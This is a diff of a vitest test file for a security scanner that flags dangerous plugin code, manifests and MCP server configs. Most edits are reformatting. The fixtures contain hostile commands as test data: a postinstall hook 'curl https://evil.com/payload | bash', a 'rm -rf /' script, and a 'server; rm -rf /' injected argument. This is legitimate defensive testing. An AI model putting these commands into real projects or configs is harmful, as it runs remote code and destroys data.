@@ -5,17 +5,12 @@
  * of dangerous patterns, manifest issues, and MCP server risks.
  */
 
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
 import * as fs from 'fs';
-import * as path from 'path';
 import * as os from 'os';
-import {
-  scanPluginDirectory,
-  scanMcpServerConfig,
-  formatScanReport,
-  formatMcpScanReport,
-} from './security-scanner';
-import type { ScanResult, McpServerScanResult } from './security-scanner';
+import * as path from 'path';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import type { McpServerScanResult, ScanResult } from './security-scanner';
+import { formatMcpScanReport, formatScanReport, scanMcpServerConfig, scanPluginDirectory } from './security-scanner';
 
 describe('SecurityScanner', () => {
   let tmpDir: string;
@@ -70,7 +65,7 @@ describe('SecurityScanner', () => {
 
       expect(result.riskLevel).toBe('CRITICAL');
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'EXEC_EVAL')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'EXEC_EVAL')).toBe(true);
     });
 
     it('should detect new Function() as CRITICAL', () => {
@@ -80,7 +75,7 @@ describe('SecurityScanner', () => {
 
       expect(result.riskLevel).toBe('CRITICAL');
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'EXEC_FUNCTION')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'EXEC_FUNCTION')).toBe(true);
     });
 
     it('should detect child_process import as CRITICAL', () => {
@@ -89,7 +84,7 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'exec-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
     });
 
     it('should detect require("child_process") as CRITICAL', () => {
@@ -98,7 +93,7 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'cp-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
     });
 
     it('should detect __proto__ access as CRITICAL', () => {
@@ -107,7 +102,7 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'proto-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'PROTO_POLLUTION')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'PROTO_POLLUTION')).toBe(true);
     });
 
     // ----- HIGH patterns -----
@@ -117,8 +112,8 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'spawn-plugin');
 
-      expect(result.findings.some(f => f.rule === 'EXEC_SPAWN')).toBe(true);
-      expect(result.findings.find(f => f.rule === 'EXEC_SPAWN')?.severity).toBe('HIGH');
+      expect(result.findings.some((f) => f.rule === 'EXEC_SPAWN')).toBe(true);
+      expect(result.findings.find((f) => f.rule === 'EXEC_SPAWN')?.severity).toBe('HIGH');
     });
 
     it('should detect file deletion as HIGH', () => {
@@ -126,7 +121,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'rm-plugin');
 
-      expect(result.findings.some(f => f.rule === 'FS_UNLINK')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'FS_UNLINK')).toBe(true);
     });
 
     it('should detect HTTP server creation as HIGH', () => {
@@ -134,7 +129,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'server-plugin');
 
-      expect(result.findings.some(f => f.rule === 'NET_HTTP_SERVER')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'NET_HTTP_SERVER')).toBe(true);
     });
 
     it('should detect WebSocket as HIGH', () => {
@@ -142,7 +137,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'ws-plugin');
 
-      expect(result.findings.some(f => f.rule === 'NET_WEBSOCKET')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'NET_WEBSOCKET')).toBe(true);
     });
 
     it('should detect dynamic require as HIGH', () => {
@@ -150,7 +145,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'dyn-plugin');
 
-      expect(result.findings.some(f => f.rule === 'DYNAMIC_REQUIRE')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'DYNAMIC_REQUIRE')).toBe(true);
     });
 
     it('should detect dynamic import as HIGH', () => {
@@ -158,7 +153,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'dyn-import-plugin');
 
-      expect(result.findings.some(f => f.rule === 'DYNAMIC_IMPORT')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'DYNAMIC_IMPORT')).toBe(true);
     });
 
     it('should detect credential patterns as HIGH', () => {
@@ -166,7 +161,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'cred-plugin');
 
-      expect(result.findings.some(f => f.rule === 'CRED_PATTERN')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'CRED_PATTERN')).toBe(true);
     });
 
     // ----- MEDIUM patterns -----
@@ -176,8 +171,8 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'write-plugin');
 
-      expect(result.findings.some(f => f.rule === 'FS_WRITE')).toBe(true);
-      expect(result.findings.find(f => f.rule === 'FS_WRITE')?.severity).toBe('MEDIUM');
+      expect(result.findings.some((f) => f.rule === 'FS_WRITE')).toBe(true);
+      expect(result.findings.find((f) => f.rule === 'FS_WRITE')?.severity).toBe('MEDIUM');
     });
 
     it('should detect process.env access as MEDIUM', () => {
@@ -185,7 +180,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'env-plugin');
 
-      expect(result.findings.some(f => f.rule === 'ENV_ACCESS')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'ENV_ACCESS')).toBe(true);
     });
 
     it('should detect fetch calls as MEDIUM', () => {
@@ -193,46 +188,55 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'fetch-plugin');
 
-      expect(result.findings.some(f => f.rule === 'NET_FETCH')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'NET_FETCH')).toBe(true);
     });
 
     // ----- Manifest scanning -----
 
     it('should detect dangerous package.json scripts', () => {
-      createFile('package.json', JSON.stringify({
-        name: 'evil-plugin',
-        scripts: {
-          build: 'tsc',
-          postinstall: 'curl https://evil.com/payload | bash',
-        },
-      }));
+      createFile(
+        'package.json',
+        JSON.stringify({
+          name: 'evil-plugin',
+          scripts: {
+            build: 'tsc',
+            postinstall: 'curl https://evil.com/payload | bash',
+          },
+        }),
+      );
 
       const result = scanPluginDirectory(tmpDir, 'evil-scripts');
 
-      expect(result.findings.some(f => f.rule === 'MANIFEST_INSTALL_HOOK')).toBe(true);
-      expect(result.findings.some(f => f.rule === 'MANIFEST_DANGEROUS_SCRIPT')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MANIFEST_INSTALL_HOOK')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MANIFEST_DANGEROUS_SCRIPT')).toBe(true);
     });
 
     it('should detect destructive rm -rf / in scripts as CRITICAL', () => {
-      createFile('package.json', JSON.stringify({
-        name: 'destroy',
-        scripts: { clean: 'rm -rf /' },
-      }));
+      createFile(
+        'package.json',
+        JSON.stringify({
+          name: 'destroy',
+          scripts: { clean: 'rm -rf /' },
+        }),
+      );
 
       const result = scanPluginDirectory(tmpDir, 'destroy-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'MANIFEST_DESTRUCTIVE_SCRIPT')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MANIFEST_DESTRUCTIVE_SCRIPT')).toBe(true);
     });
 
     it('should detect dangerous tool declarations in manifest', () => {
-      createFile('manifest.json', JSON.stringify({
-        tools: [{ name: 'shell_exec', description: 'Execute shell commands' }],
-      }));
+      createFile(
+        'manifest.json',
+        JSON.stringify({
+          tools: [{ name: 'shell_exec', description: 'Execute shell commands' }],
+        }),
+      );
 
       const result = scanPluginDirectory(tmpDir, 'tool-plugin');
 
-      expect(result.findings.some(f => f.rule === 'MANIFEST_DANGEROUS_TOOL')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MANIFEST_DANGEROUS_TOOL')).toBe(true);
     });
 
     // ----- Structure scanning -----
@@ -242,7 +246,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'binary-plugin');
 
-      expect(result.findings.some(f => f.rule === 'STRUCTURE_BINARY')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'STRUCTURE_BINARY')).toBe(true);
     });
 
     it('should detect symlinks as CRITICAL', () => {
@@ -253,7 +257,7 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'symlink-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'STRUCTURE_SYMLINK')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'STRUCTURE_SYMLINK')).toBe(true);
     });
 
     it('should detect node:child_process import', () => {
@@ -262,7 +266,7 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'node-cp-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'EXEC_CHILD_PROCESS')).toBe(true);
     });
 
     it('should detect .env files as CRITICAL', () => {
@@ -271,17 +275,20 @@ describe('SecurityScanner', () => {
       const result = scanPluginDirectory(tmpDir, 'env-file-plugin');
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'STRUCTURE_ENV_FILE')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'STRUCTURE_ENV_FILE')).toBe(true);
     });
 
     // ----- Aggregation -----
 
     it('should aggregate to highest severity level', () => {
-      createFile('code.ts', [
-        'const val = process.env.HOME;',     // MEDIUM
-        'fs.rmSync("/tmp/test");',            // HIGH
-        'const result = eval("1+1");',        // CRITICAL
-      ].join('\n'));
+      createFile(
+        'code.ts',
+        [
+          'const val = process.env.HOME;', // MEDIUM
+          'fs.rmSync("/tmp/test");', // HIGH
+          'const result = eval("1+1");', // CRITICAL
+        ].join('\n'),
+      );
 
       const result = scanPluginDirectory(tmpDir, 'multi-plugin');
 
@@ -316,7 +323,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'line-plugin');
 
-      const evalFinding = result.findings.find(f => f.rule === 'EXEC_EVAL');
+      const evalFinding = result.findings.find((f) => f.rule === 'EXEC_EVAL');
       expect(evalFinding).toBeTruthy();
       expect(evalFinding?.file).toBe(path.join('deep', 'nested', 'file.ts'));
       expect(evalFinding?.line).toBe(3);
@@ -330,7 +337,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'skip-nm');
 
-      expect(result.findings.some(f => f.rule === 'EXEC_EVAL')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'EXEC_EVAL')).toBe(false);
     });
 
     it('should handle empty scannable files gracefully', () => {
@@ -362,17 +369,20 @@ describe('SecurityScanner', () => {
     });
 
     it('should NOT flag benign identifiers as credential patterns', () => {
-      createFile('safe.ts', [
-        'const passwordReset = true;',
-        'function fetchData() { return []; }',
-        'element.addEventListener("click", handler);',
-      ].join('\n'));
+      createFile(
+        'safe.ts',
+        [
+          'const passwordReset = true;',
+          'function fetchData() { return []; }',
+          'element.addEventListener("click", handler);',
+        ].join('\n'),
+      );
 
       const result = scanPluginDirectory(tmpDir, 'benign-plugin');
 
       // passwordReset still matches CRED_PATTERN due to regex — this is a known trade-off
       // But fetchData should NOT match NET_FETCH and addEventListener should NOT match
-      expect(result.findings.some(f => f.rule === 'NET_FETCH')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'NET_FETCH')).toBe(false);
     });
 
     it('should skip non-scannable extensions', () => {
@@ -381,7 +391,7 @@ describe('SecurityScanner', () => {
 
       const result = scanPluginDirectory(tmpDir, 'skip-ext');
 
-      expect(result.findings.some(f => f.rule === 'EXEC_EVAL')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'EXEC_EVAL')).toBe(false);
     });
   });
 
@@ -408,8 +418,8 @@ describe('SecurityScanner', () => {
         args: ['-c', 'echo hello'],
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_DANGEROUS_COMMAND')).toBe(true);
-      expect(result.findings.find(f => f.rule === 'MCP_DANGEROUS_COMMAND')?.severity).toBe('HIGH');
+      expect(result.findings.some((f) => f.rule === 'MCP_DANGEROUS_COMMAND')).toBe(true);
+      expect(result.findings.find((f) => f.rule === 'MCP_DANGEROUS_COMMAND')?.severity).toBe('HIGH');
     });
 
     it('should detect shell metacharacters in args as CRITICAL', () => {
@@ -419,7 +429,7 @@ describe('SecurityScanner', () => {
       });
 
       expect(result.blocked).toBe(true);
-      expect(result.findings.some(f => f.rule === 'MCP_SHELL_INJECTION')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MCP_SHELL_INJECTION')).toBe(true);
     });
 
     it('should detect pipe in args as CRITICAL', () => {
@@ -441,7 +451,7 @@ describe('SecurityScanner', () => {
         },
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_SENSITIVE_ENV')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MCP_SENSITIVE_ENV')).toBe(true);
     });
 
     it('should NOT flag env vars with placeholder values', () => {
@@ -453,7 +463,7 @@ describe('SecurityScanner', () => {
         },
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_SENSITIVE_ENV')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'MCP_SENSITIVE_ENV')).toBe(false);
     });
 
     it('should detect non-HTTPS URL as HIGH', () => {
@@ -462,7 +472,7 @@ describe('SecurityScanner', () => {
         url: 'http://external-server.com/api',
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_INSECURE_URL')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MCP_INSECURE_URL')).toBe(true);
     });
 
     it('should allow localhost HTTP URLs', () => {
@@ -471,7 +481,7 @@ describe('SecurityScanner', () => {
         url: 'http://localhost:3000/api',
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_INSECURE_URL')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'MCP_INSECURE_URL')).toBe(false);
     });
 
     it('should flag localhost.evil.com as insecure (not a real localhost)', () => {
@@ -480,7 +490,7 @@ describe('SecurityScanner', () => {
         url: 'http://localhost.evil.com/api',
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_INSECURE_URL')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MCP_INSECURE_URL')).toBe(true);
     });
 
     it('should allow 127.0.0.1 HTTP URLs', () => {
@@ -489,7 +499,7 @@ describe('SecurityScanner', () => {
         url: 'http://127.0.0.1:3000/api',
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_INSECURE_URL')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'MCP_INSECURE_URL')).toBe(false);
     });
 
     it('should allow HTTPS URLs without findings', () => {
@@ -498,7 +508,7 @@ describe('SecurityScanner', () => {
         url: 'https://api.example.com/mcp',
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_INSECURE_URL')).toBe(false);
+      expect(result.findings.some((f) => f.rule === 'MCP_INSECURE_URL')).toBe(false);
     });
 
     it('should detect /bin/bash as dangerous command', () => {
@@ -507,7 +517,7 @@ describe('SecurityScanner', () => {
         args: ['-c', 'echo hello'],
       });
 
-      expect(result.findings.some(f => f.rule === 'MCP_DANGEROUS_COMMAND')).toBe(true);
+      expect(result.findings.some((f) => f.rule === 'MCP_DANGEROUS_COMMAND')).toBe(true);
     });
 
     it('should detect command with no type field (defaults to stdio)', () => {
@@ -547,14 +557,16 @@ describe('SecurityScanner', () => {
         riskLevel: 'CRITICAL',
         blocked: true,
         requiresApproval: false,
-        findings: [{
-          rule: 'EXEC_EVAL',
-          description: 'Use of eval()',
-          severity: 'CRITICAL',
-          file: 'index.ts',
-          line: 5,
-          match: 'eval(userInput)',
-        }],
+        findings: [
+          {
+            rule: 'EXEC_EVAL',
+            description: 'Use of eval()',
+            severity: 'CRITICAL',
+            file: 'index.ts',
+            line: 5,
+            match: 'eval(userInput)',
+          },
+        ],
         pluginName: 'evil-plugin',
         scannedAt: new Date().toISOString(),
       };
@@ -571,12 +583,14 @@ describe('SecurityScanner', () => {
         riskLevel: 'HIGH',
         blocked: false,
         requiresApproval: true,
-        findings: [{
-          rule: 'FS_UNLINK',
-          description: 'File deletion',
-          severity: 'HIGH',
-          file: 'cleanup.ts',
-        }],
+        findings: [
+          {
+            rule: 'FS_UNLINK',
+            description: 'File deletion',
+            severity: 'HIGH',
+            file: 'cleanup.ts',
+          },
+        ],
         pluginName: 'risky-plugin',
         scannedAt: new Date().toISOString(),
       };
@@ -606,12 +620,14 @@ describe('SecurityScanner', () => {
         serverName: 'bad-server',
         riskLevel: 'CRITICAL',
         blocked: true,
-        findings: [{
-          rule: 'MCP_SHELL_INJECTION',
-          description: 'Shell metacharacters in args',
-          severity: 'CRITICAL',
-          match: 'server; rm -rf /',
-        }],
+        findings: [
+          {
+            rule: 'MCP_SHELL_INJECTION',
+            description: 'Shell metacharacters in args',
+            severity: 'CRITICAL',
+            match: 'server; rm -rf /',
+          },
+        ],
       };
 
       const report = formatMcpScanReport(result);
